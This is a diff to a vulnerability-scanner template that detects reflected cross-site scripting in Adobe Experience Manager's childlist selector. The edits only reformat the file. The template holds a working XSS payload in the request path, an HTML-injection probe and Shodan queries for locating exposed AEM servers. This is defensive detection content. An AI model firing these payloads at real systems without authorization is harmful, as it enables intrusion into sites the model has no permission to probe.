@@ -1,5 +1,4 @@
 id: aem-xss-childlist
-
 info:
   name: Adobe Experience Manager Childlist Selector - Cross-Site Scripting
   author: theabhinavgaur
@@ -12,23 +11,20 @@ info:
     cwe-id: CWE-80
     cpe: cpe:2.3:a:adobe:experience_manager:*:*:*:*:*:*:*:*
   metadata:
-    verified: true
     max-request: 2
-    vendor: adobe
     product: experience_manager
     shodan-query:
       - http.title:"AEM Sign In"
       - http.component:"Adobe Experience Manager"
-  tags: xss,aem,adobe,misconfig,vuln
-
+    vendor: adobe
+    verified: true
+  tags: adobe,aem,misconfig,vuln,xss
 http:
   - method: GET
     path:
       - "{{BaseURL}}/{{rand_base(4)}}<img src=x data'a'onerror=alert(domain)>.childrenlist.html"
       - "{{BaseURL}}/{{rand_base(4)}}<br><br>please%20authenticate<br><br>.childrenlist.html"
-
     stop-at-first-match: true
-
     matchers-condition: and
     matchers:
       - type: word
@@ -37,18 +33,15 @@ http:
           - '<img src="x" data onerror="alert(domain)"/>'
           - '<br /><br />please authenticate<br /><br />'
         condition: or
-
       - type: word
         part: body
         words:
           - 'data-coral-columnview-id'
-
       - type: word
         part: content_type
         words:
           - 'text/html'
-
       - type: status
         status:
           - 200
-
+        # digest: 4b0a00483046022100e80cd928fb39bf8708049a09059c9253ac550902016631edfc61cd93b72171e5022100fbd07441498dc9ed41165c0cf01ff0c26f45c5526aaf198b213012799ad3ed2e:922c64590222798bb761d5b6d8e72950
